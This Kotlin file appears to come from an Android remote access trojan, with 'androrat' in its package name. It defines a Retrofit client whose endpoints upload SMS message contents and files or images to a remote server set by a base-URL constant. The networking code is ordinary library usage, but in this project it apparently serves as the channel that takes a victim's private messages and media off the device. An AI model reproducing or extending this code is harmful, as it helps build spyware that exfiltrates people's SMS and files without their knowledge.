package com.ierusalem.androrat.core.networking

import android.content.Context
import com.chuckerteam.chucker.api.ChuckerCollector
import com.chuckerteam.chucker.api.ChuckerInterceptor
import com.google.gson.GsonBuilder
import com.ierusalem.androrat.core.utility.Constants
import okhttp3.OkHttpClient
import okhttp3.RequestBody
import okhttp3.ResponseBody
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {

    @POST("message/")
    suspend fun postMessages(
        @Body smsModel: SMSModel
    ): Response<ResponseBody>

    @POST("file/")
    suspend fun postImage(
        @Body body: RequestBody
    ): Response<ResponseBody>

}

class RetrofitInstance(context: Context) {

    private val chuckerCollector = ChuckerCollector(
        context = context,
        showNotification = true,
    )

    // Create the Interceptor
    private val chuckerInterceptor = ChuckerInterceptor.Builder(context)
        .collector(chuckerCollector)
        .maxContentLength(250_000L)
        .alwaysReadResponseBody(false)
        .redactHeaders(emptySet())
        .build()

    private val loggingInterceptor = HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY)

    private val client = OkHttpClient.Builder()
        .addInterceptor(loggingInterceptor)
        .addInterceptor(chuckerInterceptor)
        .build()

    private val gson = GsonBuilder()
        .setLenient()
        .create()

    val api: ApiService by lazy {
        val retrofit = Retrofit.Builder()
            .baseUrl(Constants.BASE_URL)
            .client(client)
            .addConverterFactory(GsonConverterFactory.create(gson))
            .build()
        retrofit.create(ApiService::class.java)
    }
}

data class SMSModel(
    val message: String
)